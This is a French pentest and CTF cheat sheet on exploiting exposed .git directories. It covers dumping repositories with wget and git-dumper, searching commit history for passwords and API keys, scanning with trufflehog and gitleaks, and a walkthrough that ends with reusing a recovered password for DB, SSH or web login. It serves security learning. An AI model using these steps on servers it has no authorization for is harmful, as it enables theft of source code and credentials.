# GIT ENUMERATION

{% embed url="https://notes.benheater.com/books/web/page/git-dumper?ref=benheater.com" %}

### <mark style="color:red;">🧩 Contexte</mark>

* Les répertoires `.git/` exposés sur un serveur web (souvent oubliés après un déploiement) permettent :
  * De récupérer **tout l’historique de code source**.
  * De découvrir des **mots de passe, clés API, tokens** supprimés mais présents dans l’historique.
  * De révéler des **failles de logique** ou des informations sensibles (ex: routes cachées, secrets de build).

***

### <mark style="color:red;">🔎 Commandes Git utiles en pentest</mark>

#### <mark style="color:green;">1. Récupérer un dépôt</mark> <mark style="color:green;"></mark><mark style="color:green;">`.git`</mark>

```sh
# Télécharger avec wget
wget -r -np -R "index.html*" http://target/.git/

-r : mode récursif (télécharge les fichiers et sous-dossiers)
-np : "no parent" - ne remonte pas dans les dossiers parents
-R "index.html*" : rejette/exclut les fichiers correspondant au pattern "index.html*"

# Outil spécialisé
git-dumper http://target/.git/ ./dumped_repo
```

***

#### <mark style="color:green;">2. Réinitialiser l’arborescence pour naviguer</mark>

```bash
cd dumped_repo
git reset --hard
```

***

#### <mark style="color:green;">3. Visualiser l’historique complet</mark>

```bash
git log --stat --all
```

* `--stat` → montre les fichiers modifiés/supprimés.
* `--all` → inclut toutes les branches et commits, même orphelins.

Exemple sortie :

```
commit 83d2f4b
Author: dev <dev@target>
Date:   Tue Jan 5 14:23:11 2025

 config.php | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
```

⚠️ Indice : un mot de passe supprimé peut apparaître ici.

***

#### <mark style="color:green;">4. Explorer les commits en détail</mark>

```bash
git show <commit_id>
```

➡️ Montre les changements exacts, souvent secrets supprimés par erreur.

***

#### <mark style="color:green;">5. Parcourir toutes les branches et tags</mark>

```bash
git branch -a
git tag -l
```

***

#### <mark style="color:green;">6. Rechercher des secrets dans l’historique</mark>

```bash
git log -p | grep -i "password"
git log -p | grep -i "secret"
git log -p | grep -i "api"
```

***

#### <mark style="color:$danger;">7. Récupérer un fichier à un commit précis</mark>

```bash
git checkout <commit_id> -- config.php
```

{% code fullWidth="true" %}
````shellscript
git rev-list --all | xargs git -P grep --color -air "\.htb" | sort -u


- Liste **tous les commits** de toutes les branches, tags, etc.
- Sortie : une liste de hashes de commits (SHA)

**Exemple de sortie :**
```
a1b2c3d4e5f6...
f6e5d4c3b2a1...
9876543210ab...
```

---

### **Partie 2 : `| xargs git -P grep`**

- `|` : pipe (envoie la sortie à la commande suivante)
- `xargs` : prend chaque ligne et l'utilise comme argument pour la commande suivante
- `git -P grep` : cherche du texte dans Git
  - `-P` : désactive la pagination (affiche tout d'un coup)

**Résultat** : Pour chaque commit, on va faire une recherche avec `grep`

---

### **Partie 3 : `--color -air "\.htb"`**

Options de `git grep` :

- `--color` : colore les résultats (met en surbrillance les correspondances)
- `-a` : traite tous les fichiers comme du texte (même les binaires)
- `-i` : insensible à la casse (ignore majuscules/minuscules)
- `-r` : récursif (cherche dans tous les sous-dossiers)
- `"\.htb"` : le pattern recherché
  - `\.` : un point littéral (échappé)
  - `htb` : les lettres "htb"
  - **Cherche** : n'importe quoi contenant `.htb` (comme `domain.htb`, `test.htb`, etc.)

---

### **Partie 4 : `| sort -u`**

- `sort` : trie les résultats
- `-u` : unique (supprime les doublons)

````
{% endcode %}

***

### <mark style="color:red;">🛠 Outils spécialisés pour Git enumeration</mark>

*   [**git-dumper**](https://github.com/arthaud/git-dumper)\
    → Télécharge automatiquement un dépôt `.git` exposé.

    ```bash
    python3 git_dumper.py http://target/.git/ ./target_repo
    ```
* [**git-tools**](https://github.com/internetwache/GitTools)
  * `gitdumper.sh` : dump complet.
  * `extractor.sh` : restaure l’arborescence et commits.
*   [**trufflehog**](https://github.com/trufflesecurity/trufflehog)\
    → Scan des secrets (regex + entropie) dans l’historique Git.

    ```bash
    trufflehog --regex --entropy=False ./target_repo
    ```
* [**gitleaks**](https://github.com/gitleaks/gitleaks)\
  → Alternative moderne à trufflehog pour secrets dans git.

***

### <mark style="color:red;">📂 Exemple d’exploitation en CTF</mark>

#### <mark style="color:green;">Étape 1 – Découverte</mark>

```bash
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
```

→ Détection de `.git/`.

#### <mark style="color:green;">Étape 2 – Dump du repo</mark>

```bash
git-dumper http://target/.git/ ./repo
cd repo && git reset --hard
```

#### <mark style="color:green;">Étape 3 – Recherche d’indices</mark>

```bash
git log --stat --all
git show <commit_id>
grep -r "password" .
```

#### <mark style="color:green;">Étape 4 – Secret trouvé</mark>

Exemple :

```php
$db_pass = "Sup3rS3cr3tP@ss!";
```

➡️ Utilisation pour login DB / SSH / Web.

***
